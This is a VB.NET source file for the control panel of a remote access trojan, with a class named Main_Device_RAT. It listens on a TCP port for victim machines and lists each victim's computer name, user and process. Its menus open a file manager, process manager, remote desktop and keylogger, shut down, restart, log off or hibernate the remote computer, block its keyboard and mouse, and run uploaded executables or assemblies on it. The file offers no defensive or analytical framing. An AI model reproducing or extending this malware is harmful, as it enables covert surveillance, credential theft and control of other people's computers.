Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading
Imports System.Net.NetworkInformation
Imports System.Runtime.InteropServices

Public Class Form1
    Public BrowsedDirectory As String = ""
    Public Rat As New Main_Device_RAT
    Public Password As String = "Password"
    Public Computername As String = ""
    Public Username As String = ""
    Public Process1 As String = ""
    Public Client As New TcpClient()
    Public Port As Integer = 5000
    Public TcpListener As New TcpListener(IPAddress.Any, Port)
    Public Writer As IO.BinaryWriter
    Public Reader As IO.BinaryReader
    Public Stream As NetworkStream
    Public Bool As Boolean = False
    Public Sub Connect()
        Try
            Dim stopwatch As New Stopwatch
            stopwatch.Start()
            Client.Close()
            Client = New TcpClient
            TcpListener.Start()
1:          If TcpListener.Pending = True Then
                Client = TcpListener.AcceptTcpClient()
                Stream = Client.GetStream
                Reader = New IO.BinaryReader(Stream)
                Writer = New IO.BinaryWriter(Stream)
                Bool = True
                stopwatch.Stop()
            Else
                If stopwatch.Elapsed.Seconds >= 30 Then
                    MsgBox("No Connection Availble")
                    Browse.Close()
                    Download.Close()
                    File_Manager.Close()
                    Remote_Desktop.Close()
                    Info.Close()
                    KeyLogger.Close()
                    Upload.Close()
                    Process_Manager.Close()
                    For Each item In ListView1.Items
                        ListView1.Items.Remove(item)
                    Next
                    Bool = False
                    TcpListener.Stop()
                    stopwatch.Stop()
                    Exit Sub
                Else
                    Bool = False
                    GoTo 1
                End If
            End If
            TcpListener.Stop()
        Catch ex As Exception
            Client.Close()
            Reader = Nothing
            Writer = Nothing
            Stream = Nothing
            Connect()
        End Try
    End Sub
    Public Sub UpdateClientInfo()
        Try
            If Bool = True Then
                Rat.GetClientInfo(Computername, Username, Process1)
                Dim EndPoint As IPEndPoint = Client.Client.LocalEndPoint
                With ListView1
                    Dim item1 As ListViewItem
                    item1 = .FindItemWithText(Computername)
                    If Not item1 Is Nothing Then
                        ListView1.Items.Remove(item1)
                    End If
                End With
                Dim Item As ListViewItem
                Item = ListView1.Items.Add(Computername)
                Item.SubItems.Add(Username)
                Item.SubItems.Add(Process1)
                Item.SubItems.Add(EndPoint.Address.ToString)
                Item.SubItems.Add(EndPoint.Port.ToString)
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Dim p As Process = Process.GetCurrentProcess
        p.Kill()
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        File_Manager.Show()
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        Process_Manager.Show()
    End Sub
    Private Sub RemoteDesktopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        Try
            Remote_Desktop.Show()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub KeyLoggerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeyLoggerToolStripMenuItem.Click
        Try
            KeyLogger.Show()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ShutDownComputerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutDownComputerToolStripMenuItem.Click
        Try
            Connect()
            Rat.ShutdownComputer()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub RestartPCToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartPCToolStripMenuItem.Click
        Try
            Connect()
            Rat.RestartComputer()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub LogoffPCToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffPCToolStripMenuItem.Click
        Try
            Connect()
            Rat.LogoffComputer()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub HibernatePCToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HibernatePCToolStripMenuItem.Click
        Try
            Connect()
            Rat.HibernateComputer()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub BlockInputsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BlockInputsToolStripMenuItem.Click
        Try
            Connect()
            Rat.BlockInput()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub UnbloackInputsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UnbloackInputsToolStripMenuItem.Click
        Try
            Connect()
            Rat.UnblockInput()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem2.Click
        Port = 5000
        TcpListener = New TcpListener(IPAddress.Any, Port)
        Connect()
        UpdateClientInfo()
    End Sub

    Private Sub RunExecutableFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunExecutableFileToolStripMenuItem.Click
        Try
            Connect()
            Using ofd As New OpenFileDialog
                ofd.Filter = "Executable Files (*.exe)|*.exe|All files (*.*)|*.*"
                ofd.DefaultExt = ".exe"
                Dim Result = ofd.ShowDialog
                If Result = DialogResult.OK Or Result = DialogResult.Yes Then
                    Rat.InvokeEXE(IO.File.ReadAllBytes(ofd.FileName))
                End If
            End Using
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub InvokeAssemblyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InvokeAssemblyToolStripMenuItem.Click
        Connect()
        Try
            Using ofd As New OpenFileDialog()
                ofd.Filter = "Executable Files (*.exe)|*.exe|Dll Files (*.dll)|*.dll|All files (*.*)|*.*"
                ofd.DefaultExt = ".exe"
                Dim Result = ofd.ShowDialog
                If Result = DialogResult.Yes Or Result = DialogResult.OK Then
                    Rat.InvokeAssembly(IO.File.ReadAllBytes(ofd.FileName))
                End If
            End Using
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    <DllImport("user32.dll")>
    Public Shared Function GetAsyncKeyState(ByVal vKey As Keys) As Short
    End Function
    Private Sub CloseClientToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseClientToolStripMenuItem.Click
        Try
            Connect()
            Rat.Close()
            Dim p As Process = Process.GetCurrentProcess
            p.Kill()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Dim thread As New Threading.Thread(Sub()
                                                   Try
                                                       Do
                                                           If GetAsyncKeyState(Keys.Escape) Then
                                                               Dim p As Process = Process.GetCurrentProcess
                                                               p.Kill()
                                                           End If
                                                       Loop
                                                   Catch ex As Exception
                                                   End Try
                                               End Sub)
            thread.Start()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            If Bool = True Then
                FileManagerToolStripMenuItem.Enabled = True
                ProcessManagerToolStripMenuItem.Enabled = True
                RemoteDesktopToolStripMenuItem.Enabled = True
                KeyLoggerToolStripMenuItem.Enabled = True
                ShutDownComputerToolStripMenuItem.Enabled = True
                RestartPCToolStripMenuItem.Enabled = True
                LogoffPCToolStripMenuItem.Enabled = True
                HibernatePCToolStripMenuItem.Enabled = True
                BlockInputsToolStripMenuItem.Enabled = True
                UnbloackInputsToolStripMenuItem.Enabled = True
                ToolStripMenuItem2.Enabled = True
                RunExecutableFileToolStripMenuItem.Enabled = True
                InvokeAssemblyToolStripMenuItem.Enabled = True
                CloseClientToolStripMenuItem.Enabled = True
            Else
                FileManagerToolStripMenuItem.Enabled = False
                ProcessManagerToolStripMenuItem.Enabled = False
                RemoteDesktopToolStripMenuItem.Enabled = False
                KeyLoggerToolStripMenuItem.Enabled = False
                ShutDownComputerToolStripMenuItem.Enabled = False
                RestartPCToolStripMenuItem.Enabled = False
                LogoffPCToolStripMenuItem.Enabled = False
                HibernatePCToolStripMenuItem.Enabled = False
                BlockInputsToolStripMenuItem.Enabled = False
                UnbloackInputsToolStripMenuItem.Enabled = False
                ToolStripMenuItem2.Enabled = True
                RunExecutableFileToolStripMenuItem.Enabled = False
                InvokeAssemblyToolStripMenuItem.Enabled = False
                CloseClientToolStripMenuItem.Enabled = False
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged

    End Sub
End Class